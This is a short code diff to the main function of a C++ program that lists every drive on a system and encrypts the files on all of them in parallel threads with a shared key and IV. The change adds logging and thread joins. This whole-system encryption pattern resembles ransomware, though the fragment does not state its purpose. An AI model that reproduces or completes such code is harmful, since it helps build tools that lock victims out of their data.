@@ -32,18 +32,20 @@ int main(void) {
 	Systeme sys;
 	std::vector<std::string> drives = sys.getDrives();
 
-	for (std::string drive : drives) {
+	for (auto& drive : drives) {
 		DiskEncryptor diskEncryptor(drive, key, iv);
 		toEncrypt.push_back(diskEncryptor);
 	}
 
-	for (DiskEncryptor& disk : toEncrypt) {
+	for (auto& disk : toEncrypt) {
+		std::cout << "Encrypting disk: " << *disk.getDisk() << std::endl;
 		threads.push_back(std::thread(&DiskEncryptor::iterateFiles, &disk));
 	}
 
-	
 
-
+	for (std::thread& t : threads) {
+		t.join();
+	}
 	
 	return 0;
 }
